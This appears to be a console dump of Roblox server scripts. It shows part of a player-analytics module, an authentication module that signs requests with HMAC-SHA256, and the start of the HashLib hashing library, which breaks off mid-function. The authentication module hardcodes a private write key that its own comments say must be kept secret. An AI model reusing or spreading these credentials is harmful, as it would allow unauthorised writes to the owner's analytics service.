	
	local function cleanupTallyInformation(player)
		table.insert(playerJoinedTimesLeft, {
			languageID = languageKeyFromPlayer(player),
			deviceID = deviceKeyFromPlayer(player),
			finalTimeEntry = math.floor(tick() - lastWriteTime)/60
		})
		playerJoinedTimes[player.Name] = nil
		playerDevices[player.Name] = nil
		playerFramerates[player.Name] = nil
		playerLanguages[player.Name] = nil
	end
	
	-- hook enter/leave events for analytics
	for _, player in ipairs(game.Players:GetPlayers()) do
		coroutine.wrap(function() tallyNewSession(player) end)()
	end
	game.Players.PlayerAdded:Connect(tallyNewSession)
	game.Players.PlayerRemoving:Connect(cleanupTallyInformation)
end

startAnalyticsBackground()


--------|     _L Events     |--------
_L.Signal.Fired("Analytics_Increment"):Connect(Analytics.Increment)
_L.Signal.Fired("Analytics_IncrementWithLanguage"):Connect(Analytics.IncrementWithLanguage)
_L.Signal.Fired("Analytics_IncrementWithDevice"):Connect(Analytics.IncrementWithDevice)  -  Editar
  04:54:13.782    -  Editar
  04:54:13.782  ----- [2386] ServerScriptService.Scripts.Core.BIG Analytics [Secure].Authentication -----  -  Editar
  04:54:13.782  local Authentication = {}
local Encrypt = require(script.Parent:WaitForChild("Encryption"))

-- ======== AUTHENTICATION SPECIFICATION ========
-- Write requests require a few things.  First, each request must contain the
-- following fields: "TS" (timestamp), "baseURL" and "PBLC" (the public access key).
-- each request requires an 'Authentication' header, which can be built as follows:
-- MAKE_AUTH_STRING(query):
--   assert(query contains TS, baseURL, PBLC)
--   let alph = empty string
--   for key, value in alphabeticalSorted(query):
--     append (key + "=" + value + "&") to alph
--   remove trailing '&' from alph
--   let signingKey = KEY_PUBLIC + KEY_PRIVATE
--   let encrypted = HMAC_SHA256(key=signingKey, message=alph)
--   let finalAuthenticationString = "OAuth " + encrypted
-- 
-- The function Authentication.EncodeAuthenticationString implements
-- the pseudocode listed above.

-- ======== PUBLIC AND PRIVATE WRITE KEYS ========
-- protect these bad boys at all cost.  it's okay if the public key gets out, but
-- if the private key is released, anybody will be able to write data.  there is
-- an entirely different set of keys used for reading, which should never be
-- placed inside of a ROBLOX script for security purposes.  if these keys are released,
-- our data is still protected.  worst case scenario, somebody can write some junk
-- data that we can delete later.  but again, that can only happen if this source
-- code is leaked, and some neferious guy actually knows what to do w/ these keys.
-- If these are discovered, we can easily swap them out for a new set of keys.

Authentication.WRITE_KEY_PUBLIC  = "A713440C-005D-4C98-A8C4-C6639C4F14C6";
Authentication.WRITE_KEY_PRIVATE = "A201362C-52A9-462A-B4AD-92C969E30D6B";

function Authentication.EncodeAuthenticationString(queryParams)
	
	local function reportMissingField(field)
		print("Analaytics.EncodeAuthenticationString: missing field '" .. field .. "'")
		return nil
	end
	

	
	local alph = {}
	for k, v in pairs(queryParams) do
		table.insert(alph, {k, v})
	end
	
	table.sort(alph, function(a, b)
		return a[1] < b[1]
	end)
	
	local sigBase = ""
	for _, tuple in ipairs(alph) do
		sigBase = sigBase .. tuple[1] .. "=" .. tuple[2] .. "&"
	end
	sigBase = sigBase:sub(1, sigBase:len() - 1)
	
	local signingKey = Authentication.WRITE_KEY_PUBLIC .. Authentication.WRITE_KEY_PRIVATE
	local encrypted = Encrypt.hmac(Encrypt.sha256, signingKey, sigBase)
	
	local authString = "OAuth " .. encrypted
	return authString
	
end

return Authentication
  -  Editar
  04:54:13.782    -  Editar
  04:54:13.782  ----- [2387] ServerScriptService.Scripts.Core.BIG Analytics [Secure].Encryption -----  -  Editar
  04:54:13.782  --[=[------------------------------------------------------------------------------------------------------------------------
-- HashLib by Egor Skriptunoff, boatbomber, and howmanysmall

TG_Ftc7TTb74vanBj here: https://devforum.roblox.com/t/open-source-hashlib/416732/1

--------------------------------------------------------------------------------------------------------------------------

Module was originally written by Egor Skriptunoff and distributed under an MIT license.
It can be found here: https://github.com/Egor-Skriptunoff/pure_lua_SHA/blob/master/sha2.lua

That version was around 3000 lines long, and supported Lua versions 5.1, 5.2, 5.3, and 5.4, and LuaJIT.
Although that is super cool, Roblox only uses Lua 5.1, so that was extreme overkill.

I, boatbomber, worked to port it to Roblox in a way that doesn't overcomplicate it with support of unreachable
cases. Then, howmanysmall did some final optimizations that really squeeze out all the performance possible.
It's gotten stupid fast, thanks to her!

After quite a bit of work and benchmarking, this is what we were left with.
Enjoy!

--------------------------------------------------------------------------------------------------------------------------

DESCRIPTION:
	This module contains functions to calculate SHA digest:
		MD5, SHA-1,
		SHA-224, SHA-256, SHA-512/224, SHA-512/256, SHA-384, SHA-512,
		SHA3-224, SHA3-256, SHA3-384, SHA3-512, SHAKE128, SHAKE256,
		HMAC
	Additionally, it has a few extra utility functions:
		hex_to_bin
		base64_to_bin
		bin_to_base64
	Written in pure Lua.
USAGE:
	Input data should be a string
	Result (SHA digest) is returned in hexadecimal representation as a string of lowercase hex digits.
	Simplest usage example:
		local HashLib = require(script.HashLib)
		local your_hash = HashLib.sha256("your string")
API:
		HashLib.md5
		HashLib.sha1
	SHA2 hash functions:
		HashLib.sha224
		HashLib.sha256
		HashLib.sha512_224
		HashLib.sha512_256
		HashLib.sha384
		HashLib.sha512
	SHA3 hash functions:
		HashLib.sha3_224
		HashLib.sha3_256
		HashLib.sha3_384
		HashLib.sha3_512
		HashLib.shake128
		HashLib.shake256
	Misc utilities:
		HashLib.hmac (Applicable to any hash function from this module except SHAKE*)
		HashLib.hex_to_bin
		HashLib.base64_to_bin
		HashLib.bin_to_base64

--]=]---------------------------------------------------------------------------

local Base64 = require(script.Base64)

--------------------------------------------------------------------------------
-- LOCALIZATION FOR VM OPTIMIZATIONS
--------------------------------------------------------------------------------

local ipairs = ipairs

--------------------------------------------------------------------------------
-- 32-BIT BITWISE FUNCTIONS
--------------------------------------------------------------------------------
-- Only low 32 bits of function arguments matter, high bits are ignored
-- The result of all functions (except HEX) is an integer inside "correct range":
-- for "bit" library:    (-TWO_POW_31)..(TWO_POW_31-1)
-- for "bit32" library:        0..(TWO_POW_32-1)
local bit32_band = bit32.band -- 2 arguments
local bit32_bor = bit32.bor -- 2 arguments
local bit32_bxor = bit32.bxor -- 2..5 arguments
local bit32_lshift = bit32.lshift -- second argument is integer 0..31
local bit32_rshift = bit32.rshift -- second argument is integer 0..31
local bit32_lrotate = bit32.lrotate -- second argument is integer 0..31
local bit32_rrotate = bit32.rrotate -- second argument is integer 0..31

--------------------------------------------------------------------------------
-- CREATING OPTIMIZED INNER LOOP
--------------------------------------------------------------------------------
-- Arrays of SHA2 "magic numbers" (in "INT64" and "FFI" branches "*_lo" arrays contain 64-bit values)
local sha2_K_lo, sha2_K_hi, sha2_H_lo, sha2_H_hi, sha3_RC_lo, sha3_RC_hi = {}, {}, {}, {}, {}, {}
local sha2_H_ext256 = {
	[224] = {};
	[256] = sha2_H_hi;
}

local sha2_H_ext512_lo, sha2_H_ext512_hi = {
	[384] = {};
	[512] = sha2_H_lo;
}, {
	[384] = {};
	[512] = sha2_H_hi;
}

local md5_K, md5_sha1_H = {}, {0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0}
local md5_next_shift = {0, 0, 0, 0, 0, 0, 0, 0, 28, 25, 26, 27, 0, 0, 10, 9, 11, 12, 0, 15, 16, 17, 18, 0, 20, 22, 23, 21}
local HEX64, XOR64A5, lanes_index_base -- defined only for branches that internally use 64-bit integers: "INT64" and "FFI"
local common_W = {} -- temporary table shared between all calculations (to avoid creating new temporary table every time)
local K_lo_modulo, hi_factor, hi_factor_keccak = 4294967296, 0, 0

local TWO_POW_NEG_56 = 2 ^ -56
local TWO_POW_NEG_17 = 2 ^ -17

local TWO_POW_2 = 2 ^ 2
local TWO_POW_3 = 2 ^ 3
local TWO_POW_4 = 2 ^ 4
local TWO_POW_5 = 2 ^ 5
local TWO_POW_6 = 2 ^ 6
local TWO_POW_7 = 2 ^ 7
local TWO_POW_8 = 2 ^ 8
local TWO_POW_9 = 2 ^ 9
local TWO_POW_10 = 2 ^ 10
local TWO_POW_11 = 2 ^ 11
local TWO_POW_12 = 2 ^ 12
local TWO_POW_13 = 2 ^ 13
local TWO_POW_14 = 2 ^ 14
local TWO_POW_15 = 2 ^ 15
local TWO_POW_16 = 2 ^ 16
local TWO_POW_17 = 2 ^ 17
local TWO_POW_18 = 2 ^ 18
local TWO_POW_19 = 2 ^ 19
local TWO_POW_20 = 2 ^ 20
local TWO_POW_21 = 2 ^ 21
local TWO_POW_22 = 2 ^ 22
local TWO_POW_23 = 2 ^ 23
local TWO_POW_24 = 2 ^ 24
local TWO_POW_25 = 2 ^ 25
local TWO_POW_26 = 2 ^ 26
local TWO_POW_27 = 2 ^ 27
local TWO_POW_28 = 2 ^ 28
local TWO_POW_29 = 2 ^ 29
local TWO_POW_30 = 2 ^ 30
local TWO_POW_31 = 2 ^ 31
local TWO_POW_32 = 2 ^ 32
local TWO_POW_40 = 2 ^ 40

local TWO56_POW_7 = 256 ^ 7

-- Implementation for Lua 5.1/5.2 (with or without bitwise library available)
local function sha256_feed_64(H, str, offs, size)
	-- offs >= 0, size >= 0, size is multiple of 64
	local W, K = common_W, sha2_K_hi
	local h1, h2, h3, h4, h5, h6, h7, h8 = H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8]
	for pos = offs, offs + size - 1, 64 do
		for j = 1, 16 do
			pos = pos + 4
			local a, b, c, d = string.byte(str, pos - 3, pos)
			W[j] = ((a * 256 + b) * 256 + c) * 256 + d
		end

		for j = 17, 64 do
			local a, b = W[j - 15], W[j - 2]
			W[j] = bit32_bxor(bit32_rrotate(a, 7), bit32_lrotate(a, 14), bit32_rshift(a, 3)) + bit32_bxor(bit32_lrotate(b, 15), bit32_lrotate(b, 13), bit32_rshift(b, 10)) + W[j - 7] + W[j - 16]
		end

		local a, b, c, d, e, f, g, h = h1, h2, h3, h4, h5, h6, h7, h8
		for j = 1, 64 do
			local z = bit32_bxor(bit32_rrotate(e, 6), bit32_rrotate(e, 11), bit32_lrotate(e, 7)) + bit32_band(e, f) + bit32_band(-1 - e, g) + h + K[j] + W[j]
			h = g
			g = f
			f = e
			e = z + d
			d = c
			c = b
			b = a
			a = z + bit32_band(d, c) + bit32_band(a, bit32_bxor(d, c)) + bit32_bxor(bit32_rrotate(a, 2), bit32_rrotate(a, 13), bit32_lrotate(a, 10))
		end

		h1, h2, h3, h4 = (a + h1) % 4294967296, (b + h2) % 4294967296, (c + h3) % 4294967296, (d + h4) % 4294967296
		h5, h6, h7, h8 = (e + h5) % 4294967296, (f + h6) % 4294967296, (g + h7) % 4294967296, (h + h8) % 4294967296
	end

	H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8] = h1, h2, h3, h4, h5, h6, h7, h8
end

local function sha512_feed_128(H_lo, H_hi, str, offs, size)
	-- offs >= 0, size >= 0, size is multiple of 128
	-- W1_hi, W1_lo, W2_hi, W2_lo, ...   Wk_hi = W[2*k-1], Wk_lo = W[2*k]
	local W, K_lo, K_hi = common_W, sha2_K_lo, sha2_K_hi
	local h1_lo, h2_lo, h3_lo, h4_lo, h5_lo, h6_lo, h7_lo, h8_lo = H_lo[1], H_lo[2], H_lo[3], H_lo[4], H_lo[5], H_lo[6], H_lo[7], H_lo[8]
	local h1_hi, h2_hi, h3_hi, h4_hi, h5_hi, h6_hi, h7_hi, h8_hi = H_hi[1], H_hi[2], H_hi[3], H_hi[4], H_hi[5], H_hi[6], H_hi[7], H_hi[8]
	for pos = offs, offs + size - 1, 128 do
		for j = 1, 16 * 2 do
			pos = pos + 4
			local a, b, c, d = string.byte(str, pos - 3, pos)
			W[j] = ((a * 256 + b) * 256 + c) * 256 + d
		end

		for jj = 34, 160, 2 do
			local a_lo, a_hi, b_lo, b_hi = W[jj - 30], W[jj - 31], W[jj - 4], W[jj - 5]
			local tmp1 = bit32_bxor(bit32_rshift(a_lo, 1) + bit32_lshift(a_hi, 31), bit32_rshift(a_lo, 8) + bit32_lshift(a_hi, 24), bit32_rshift(a_lo, 7) + bit32_lshift(a_hi, 25)) % 4294967296 +
				bit32_bxor(bit32_rshift(b_lo, 19) + bit32_lshift(b_hi, 13), bit32_lshift(b_lo, 3) + bit32_rshift(b_hi, 29), bit32_rshift(b_lo, 6) + bit32_lshift(b_hi, 26)) % 4294967296 +
				W[jj - 14] + W[jj - 32]

			local tmp2 = tmp1 % 4294967296
			W[jj - 1] = bit32_bxor(bit32_rshift(a_hi, 1) + bit32_lshift(a_lo, 31), bit32_rshift(a_hi, 8) + bit32_lshift(a_lo, 24), bit32_rshift(a_hi, 7)) +
				bit32_bxor(bit32_rshift(b_hi, 19) + bit32_lshift(b_lo, 13), bit32_lshift(b_hi, 3) + bit32_rshift(b_lo, 29), bit32_rshift(b_hi, 6)) +
				W[jj - 15] + W[jj - 33] + (tmp1 - tmp2) / 4294967296

			W[jj] = tmp2
		end

		local a_lo, b_lo, c_lo, d_lo, e_lo, f_lo, g_lo, h_lo = h1_lo, h2_lo, h3_lo, h4_lo, h5_lo, h6_lo, h7_lo, h8_lo
		local a_hi, b_hi, c_hi, d_hi, e_hi, f_hi, g_hi, h_hi = h1_hi, h2_hi, h3_hi, h4_hi, h5_hi, h6_hi, h7_hi, h8_hi
		for j = 1, 80 do
			local jj = 2 * j
			local tmp1 = bit32_bxor(bit32_rshift(e_lo, 14) + bit32_lshift(e_hi, 18), bit32_rshift(e_lo, 18) + bit32_lshift(e_hi, 14), bit32_lshift(e_lo, 23) + bit32_rshift(e_hi, 9)) % 4294967296 +
				(bit32_band(e_lo, f_lo) + bit32_band(-1 - e_lo, g_lo)) % 4294967296 +
				h_lo + K_lo[j] + W[jj]

			local z_lo = tmp1 % 4294967296
			local z_hi = bit32_bxor(bit32_rshift(e_hi, 14) + bit32_lshift(e_lo, 18), bit32_rshift(e_hi, 18) + bit32_lshift(e_lo, 14), bit32_lshift(e_hi, 23) + bit32_rshift(e_lo, 9)) +
				bit32_band(e_hi, f_hi) + bit32_band(-1 - e_hi, g_hi) +
				h_hi + K_hi[j] + W[jj - 1] +
				(tmp1 - z_lo) / 4294967296

			h_lo = g_lo
			h_hi = g_hi
			g_lo = f_lo
			g_hi = f_hi
			f_lo = e_lo
			f_hi = e_hi
			tmp1 = z_lo + d_lo
			e_lo = tmp1 % 4294967296
			e_hi = z_hi + d_hi + (tmp1 - e_lo) / 4294967296
			d_lo = c_lo
			d_hi = c_hi
			c_lo = b_lo
			c_hi = b_hi
			b_lo = a_lo
			b_hi = a_hi
			tmp1 = z_lo + (bit32_band(d_lo, c_lo) + bit32_band(b_lo, bit32_bxor(d_lo, c_lo))) % 4294967296 + bit32_bxor(bit32_rshift(b_lo, 28) + bit32_lshift(b_hi, 4), bit32_lshift(b_lo, 30) + bit32_rshift(b_hi, 2), bit32_lshift(b_lo, 25) + bit32_rshift(b_hi, 7)) % 4294967296
			a_lo = tmp1 % 4294967296
			a_hi = z_hi + (bit32_band(d_hi, c_hi) + bit32_band(b_hi, bit32_bxor(d_hi, c_hi))) + bit32_bxor(bit32_rshift(b_hi, 28) + bit32_lshift(b_lo, 4), bit32_lshift(b_hi, 30) + bit32_rshift(b_lo, 2), bit32_lshift(b_hi, 25) + bit32_rshift(b_lo, 7)) + (tmp1 - a_lo) / 4294967296
		end

		a_lo = h1_lo + a_lo
		h1_lo = a_lo % 4294967296
		h1_hi = (h1_hi + a_hi + (a_lo - h1_lo) / 4294967296) % 4294967296
		a_lo = h2_lo + b_lo
		h2_lo = a_lo % 4294967296
		h2_hi = (h2_hi + b_hi + (a_lo - h2_lo) / 4294967296) % 4294967296
		a_lo = h3_lo + c_lo
		h3_lo = a_lo % 4294967296
		h3_hi = (h3_hi + c_hi + (a_lo - h3_lo) / 4294967296) % 4294967296
		a_lo = h4_lo + d_lo
		h4_lo = a_lo % 4294967296
		h4_hi = (h4_hi + d_hi + (a_lo - h4_lo) / 4294967296) % 4294967296
		a_lo = h5_lo + e_lo
		h5_lo = a_lo % 4294967296
		h5_hi = (h5_hi + e_hi + (a_lo - h5_lo) / 4294967296) % 4294967296
		a_lo = h6_lo + f_lo
		h6_lo = a_lo % 4294967296
		h6_hi = (h6_hi + f_hi + (a_lo - h6_lo) / 4294967296) % 4294967296
		a_lo = h7_lo + g_lo
		h7_lo = a_lo % 4294967296
		h7_hi = (h7_hi + g_hi + (a_lo - h7_lo) / 4294967296) % 4294967296
		a_lo = h8_lo + h_lo
		h8_lo = a_lo % 4294967296
		h8_hi = (h8_hi + h_hi + (a_lo - h8_lo) / 4294967296) % 4294967296
	end

	H_lo[1], H_lo[2], H_lo[3], H_lo[4], H_lo[5], H_lo[6], H_lo[7], H_lo[8] = h1_lo, h2_lo, h3_lo, h4_lo, h5_lo, h6_lo, h7_lo, h8_lo
	H_hi[1], H_hi[2], H_hi[3], H_hi[4], H_hi[5], H_hi[6], H_hi[7], H_hi[8] = h1_hi, h2_hi, h3_hi, h4_hi, h5_hi, h6_hi, h7_hi, h8_hi
end

local function md5_feed_64(H, str, offs, size)
	-- offs >= 0, size >= 0, size is multiple of 64
	local W, K, md5_next_shift = common_W, md5_K, md5_next_shift
	local h1, h2, h3, h4 = H[1], H[2], H[3], H[4]
	for pos = offs, offs + size - 1, 64 do
		for j = 1, 16 do
			pos = pos + 4
			local a, b, c, d = string.byte(str, pos - 3, pos)
			W[j] = ((d * 256 + c) * 256 + b) * 256 + a
		end

		local a, b, c, d = h1, h2, h3, h4
		local s = 25
		for j = 1, 16 do
			local F = bit32_rrotate(bit32_band(b, c) + bit32_band(-1 - b, d) + a + K[j] + W[j], s) + b
			s = md5_next_shift[s]
			a = d
			d = c
			c = b
			b = F
		end

		s = 27
		for j = 17, 32 do
			local F = bit32_rrotate(bit32_band(d, b) + bit32_band(-1 - d, c) + a + K[j] + W[(5 * j - 4) % 16 + 1], s) + b
			s = md5_next_shift[s]
			a = d
			d = c
			c = b
			b = F
		end

		s = 28
		for j = 33, 48 do
			local F = bit32_rrotate(bit32_bxor(bit32_bxor(b, c), d) + a + K[j] + W[(3 * j + 2) % 16 + 1], s) + b
			s = md5_next_shift[s]
			a = d
			d = c
			c = b
			b = F
		end

		s = 26
		for j = 49, 64 do
			local F = bit32_rrotate(bit32_bxor(c, bit32_bor(b, -1 - d)) + a + K[j] + W[(j * 7 - 7) % 16 + 1], s) + b
			s = md5_next_shift[s]
			a = d
			d = c
			c = b
			b = F
		end

		h1 = (a + h1) % 4294967296
		h2 = (b + h2) % 4294967296
		h3 = (c + h3) % 4294967296
		h4 = (d + h4) % 4294967296
	end

	H[1], H[2], H[3], H[4] = h1, h2, h3, h4
end

local function sha1_feed_64(H, str, offs, size)
	-- offs >= 0, size >= 0, size is multiple of 64
	local W = common_W
	local h1, h2, h3, h4, h5 = H[1], H[2], H[3], H[4], H[5]
	for pos = offs, offs + size - 1, 64 do
		for j = 1, 16 do
			pos = pos + 4
			local a, b, c, d = string.byte(str, pos - 3, pos)
			W[j] = ((a * 256 + b) * 256 + c) * 256 + d
		end

		for j = 17, 80 do
			W[j] = bit32_lrotate(bit32_bxor(W[j - 3], W[j - 8], W[j - 14], W[j - 16]), 1)
		end

		local a, b, c, d, e = h1, h2, h3, h4, h5
		for j = 1, 20 do
			local z = bit32_lrotate(a, 5) + bit32_band(b, c) + bit32_band(-1 - b, d) + 0x5A827999 + W[j] + e -- constant = math.floor(TWO_POW_30 * sqrt(2))
			e = d
			d = c
			c = bit32_rrotate(b, 2)
			b = a
			a = z
		end

		for j = 21, 40 do
			local z = bit32_lrotate(a, 5) + bit32_bxor(b, c, d) + 0x6ED9EBA1 + W[j] + e -- TWO_POW_30 * sqrt(3)
			e = d
			d = c
			c = bit32_rrotate(b, 2)
			b = a
			a = z
		end

		for j = 41, 60 do
			local z = bit32_lrotate(a, 5) + bit32_band(d, c) + bit32_band(b, bit32_bxor(d, c)) + 0x8F1BBCDC + W[j] + e -- TWO_POW_30 * sqrt(5)
			e = d
			d = c
			c = bit32_rrotate(b, 2)
			b = a
			a = z
		end

		for j = 61, 80 do
			local z = bit32_lrotate(a, 5) + bit32_bxor(b, c, d) + 0xCA62C1D6 + W[j] + e -- TWO_POW_30 * sqrt(10)
			e = d
			d = c
			c = bit32_rrotate(b, 2)
			b = a
			a = z
		end

		h1 = (a + h1) % 4294967296
		h2 = (b + h2) % 4294967296
		h3 = (c + h3) % 4294967296
		h4 = (d + h4) % 4294967296
		h5 = (e + h5) % 4294967296
	end

	H[1], H[2], H[3], H[4], H[5] = h1, h2, h3, h4, h5
end

local function keccak_feed(lanes_lo, lanes_hi, str, offs, size, block_size_in_bytes)
	-- This is an example of a Lua function having 79 local variables :-)
	-- offs >= 0, size >= 0, size is multiple of block_size_in_bytes, block_size_in_bytes is positive multiple of 8
	local RC_lo, RC_hi = sha3_RC_lo, sha3_RC_hi
	local qwords_qty = block_size_in_bytes / 8
	for pos = offs, offs + size - 1, block_size_in_bytes do
		for j = 1, qwords_qty do
			local a, b, c, d = string.byte(str, pos + 1, pos + 4)
			lanes_lo[j] = bit32_bxor(lanes_lo[j], ((d * 256 + c) * 256 + b) * 256 + a)
			pos = pos + 8
			a, b, c, d = string.byte(str, pos - 3, pos)
			lanes_hi[j] = bit32_bxor(lanes_hi[j], ((d * 256 + c) * 256 + b) * 256 + a)
		end

		local L01_lo, L01_hi, L02_lo, L02_hi, L03_lo, L03_hi, L04_lo, L04_hi, L05_lo, L05_hi, L06_lo, L06_hi, L07_lo, L07_hi, L08_lo, L08_hi, L09_lo, L09_hi, L10_lo, L10_hi, L11_lo, L11_hi, L12_lo, L12_hi, L13_lo, L13_hi, L14_lo, L14_hi, L15_lo, L15_hi, L16_lo, L16_hi, L17_lo, L17_hi, L18_lo, L18_hi, L19_lo, L19_hi, L20_lo, L20_hi, L21_lo, L21_hi, L22_lo, L22_hi, L23_lo, L23_hi, L24_lo, L24_hi, L25_lo, L25_hi = lanes_lo[1], lanes_hi[1], lanes_lo[2], lanes_hi[2], lanes_lo[3], lanes_hi[3], lanes_lo[4], lanes_hi[4], lanes_lo[5], lanes_hi[5], lanes_lo[6], lanes_hi[6], lanes_lo[7], lanes_hi[7], lanes_lo[8], lanes_hi[8], lanes_lo[9], lanes_hi[9], lanes_lo[10], lanes_hi[10], lanes_lo[11], lanes_hi[11], lanes_lo[12], lanes_hi[12], lanes_lo[13], lanes_hi[13], lanes_lo[14], lanes_hi[14], lanes_lo[15], lanes_hi[15], lanes_lo[16], lanes_hi[16], lanes_lo[17], lanes_hi[17], lanes_lo[18], lanes_hi[18], lanes_lo[19], lanes_hi[19], lanes_lo[20], lanes_hi[20], lanes_lo[21], lanes_hi[21], lanes_lo[22], lanes_hi[22], lanes_lo[23], lanes_hi[23], lanes_lo[24], lanes_hi[24], lanes_lo[25], lanes_hi[25]

		for round_idx = 1, 24 do
			local C1_lo = bit32_bxor(L01_lo, L06_lo, L11_lo, L16_lo, L21_lo)
			local C1_hi = bit32_bxor(L01_hi, L06_hi, L11_hi, L16_hi, L21_hi)
			local C2_lo = bit32_bxor(L02_lo, L07_lo, L12_lo, L17_lo, L22_lo)
			local C2_hi = bit32_bxor(L02_hi, L07_hi, L12_hi, L17_hi, L22_hi)
			local C3_lo = bit32_bxor(L03_lo, L08_lo, L13_lo, L18_lo, L23_lo)
			local C3_hi = bit32_bxor(L03_hi, L08_hi, L13_hi, L18_hi, L23_hi)
			local C4_lo = bit32_bxor(L04_lo, L09_lo, L14_lo, L19_lo, L24_lo)
			local C4_hi = bit32_bxor(L04_hi, L09_hi, L14_hi, L19_hi, L24_hi)
			local C5_lo = bit32_bxor(L05_lo, L10_lo, L15_lo, L20_lo, L25_lo)
			local C5_hi = bit32_bxor(L05_hi, L10_hi, L15_hi, L20_hi, L25_hi)

			local D_lo = bit32_bxor(C1_lo, C3_lo * 2 + (C3_hi % TWO_POW_32 - C3_hi % TWO_POW_31) / TWO_POW_31)
			local D_hi = bit32_bxor(C1_hi, C3_hi * 2 + (C3_lo % TWO_POW_32 - C3_lo % TWO_POW_31) / TWO_POW_31)

			local T0_lo = bit32_bxor(D_lo, L02_lo)
			local T0_hi = bit32_bxor(D_hi, L02_hi)
			local T1_lo = bit32_bxor(D_lo, L07_lo)
			local T1_hi = bit32_bxor(D_hi, L07_hi)
			local T2_lo = bit32_bxor(D_lo, L12_lo)
			local T2_hi = bit32_bxor(D_hi, L12_hi)
			local T3_lo = bit32_bxor(D_lo, L17_lo)
			local T3_hi = bit32_bxor(D_hi, L17_hi)
			local T4_lo = bit32_bxor(D_lo, L22_lo)
			local T4_hi = bit32_bxor(D_hi, L22_hi)

			L02_lo = (T1_lo % TWO_POW_32 - T1_lo % TWO_POW_20) / TWO_POW_20 + T1_hi * TWO_POW_12
			L02_hi = (T1_hi % TWO_POW_32 - T1_hi % TWO_POW_20) / TWO_POW_20 + T1_lo * TWO_POW_12
			L07_lo = (T3_lo % TWO_POW_32 - T3_lo % TWO_POW_19) / TWO_POW_19 + T3_hi * TWO_POW_13
			L07_hi = (T3_hi % TWO_POW_32 - T3_hi % TWO_POW_19) / TWO_POW_19 + T3_lo * TWO_POW_13
			L12_lo = T0_lo * 2 + (T0_hi % TWO_POW_32 - T0_hi % TWO_POW_31) / TWO_POW_31
			L12_hi = T0_hi * 2 + (T0_lo % TWO_POW_32 - T0_lo % TWO_POW_31) / TWO_POW_31
			L17_lo = T2_lo * TWO_POW_10 + (T2_hi % TWO_POW_32 - T2_hi % TWO_POW_22) / TWO_POW_22
			L17_hi = T2_hi * TWO_POW_10 + (T2_lo % TWO_POW_32 - T2_lo % TWO_POW_22) / TWO_POW_22
			L22_lo = T4_lo * TWO_POW_2 + (T4_hi % TWO_POW_32 - T4_hi % TWO_POW_30) / TWO_POW_30
			L22_hi = T4_hi * TWO_POW_2 + (T4_lo % TWO_POW_32 - T4_lo % TWO_POW_30) / TWO_POW_30

			D_lo = bit32_bxor(C2_lo, C4_lo * 2 + (C4_hi % TWO_POW_32 - C4_hi % TWO_POW_31) / TWO_POW_31)
			D_hi = bit32_bxor(C2_hi, C4_hi * 2 + (C4_lo % TWO_POW_32 - C4_lo % TWO_POW_31) / TWO_POW_31)

			T0_lo = bit32_bxor(D_lo, L03_lo)
			T0_hi = bit32_bxor(D_hi, L03_hi)
			T1_lo = bit32_bxor(D_lo, L08_lo)
			T1_hi = bit32_bxor(D_hi, L08_hi)
			T2_lo = bit32_bxor(D_lo, L13_lo)
			T2_hi = bit32_bxor(D_hi, L13_hi)
			T3_lo = bit32_bxor(D_lo, L18_lo)
			T3_hi = bit32_bxor(D_hi, L18_hi)
			T4_lo = bit32_bxor(D_lo, L23_lo)
			T4_hi = bit32_bxor(D_hi, L23_hi)

			L03_lo = (T2_lo % TWO_POW_32 - T2_lo % TWO_POW_21) / TWO_POW_21 + T2_hi * TWO_POW_11
			L03_hi = (T2_hi % TWO_POW_32 - T2_hi % TWO_POW_21) / TWO_POW_21 + T2_lo * TWO_POW_11
			L08_lo = (T4_lo % TWO_POW_32 - T4_lo % TWO_POW_3) / TWO_POW_3 + T4_hi * TWO_POW_29 % TWO_POW_32
			L08_hi = (T4_hi % TWO_POW_32 - T4_hi % TWO_POW_3) / TWO_POW_3 + T4_lo * TWO_POW_29 % TWO_POW_32
			L13_lo = T1_lo * TWO_POW_6 + (T1_hi % TWO_POW_32 - T1_hi % TWO_POW_26) / TWO_POW_26
			L13_hi = T1_hi * TWO_POW_6 + (T1_lo % TWO_POW_32 - T1_lo % TWO_POW_26) / TWO_POW_26
			L18_lo = T3_lo * TWO_POW_15 + (T3_hi % TWO_POW_32 - T3_hi % TWO_POW_17) / TWO_POW_17
			L18_hi = T3_hi * TWO_POW_15 + (T3_lo % TWO_POW_32 - T3_lo % TWO_POW_17) / TWO_POW_17
			L23_lo = (T0_lo % TWO_POW_32 - T0_lo % TWO_POW_2) / TWO_POW_2 + T0_hi * TWO_POW_30 % TWO_POW_32
			L23_hi = (T0_hi % TWO_POW_32 - T0_hi % TWO_POW_2) / TWO_POW_2 + T0_lo * TWO_POW_30 % TWO_POW_32

			D_lo = bit32_bxor(C3_lo, C5_lo * 2 + (C5_hi % TWO_POW_32 - C5_hi % TWO_POW_31) / TWO_POW_31)
			D_hi = bit32_bxor(C3_hi, C5_hi * 2 + (C5_lo % TWO_POW_32 - C5_lo % TWO_POW_31) / TWO_POW_31)

			T0_lo = bit32_bxor(D_lo, L04_lo)
			T0_hi = bit32_bxor(D_hi, L04_hi)
			T1_lo = bit32_bxor(D_lo, L09_lo)
			T1_hi = bit32_bxor(D_hi, L09_hi)
			T2_lo = bit32_bxor(D_lo, L14_lo)
			T2_hi = bit32_bxor(D_hi, L14_hi)
			T3_lo = bit32_bxor(D_lo, L19_lo)
			T3_hi = bit32_bxor(D_hi, L19_hi)
			T4_lo = bit32_bxor(D_lo, L24_lo)
			T4_hi = bit32_bxor(D_hi, L24_hi)

			L04_lo = T3_lo * TWO_POW_21 % TWO_POW_32 + (T3_hi % TWO_POW_32 - T3_hi % TWO_POW_11) / TWO_POW_11
			L04_hi = T3_hi * TWO_POW_21 % TWO_POW_32 + (T3_lo % TWO_POW_32 - T3_lo % TWO_POW_11) / TWO_POW_11
			L09_lo = T0_lo * TWO_POW_28 % TWO_POW_32 + (T0_hi % TWO_POW_32 - T0_hi % TWO_POW_4) / TWO_POW_4
			L09_hi = T0_hi * TWO_POW_28 % TWO_POW_32 + (T0_lo % TWO_POW_32 - T0_lo % TWO_POW_4) / TWO_POW_4
			L14_lo = T2_lo * TWO_POW_25 % TWO_POW_32 + (T2_hi % TWO_POW_32 - T2_hi % TWO_POW_7) / TWO_POW_7
			L14_hi = T2_hi * TWO_POW_25 % TWO_POW_32 + (T2_lo % TWO_POW_32 - T2_lo % TWO_POW_7) / TWO_POW_7
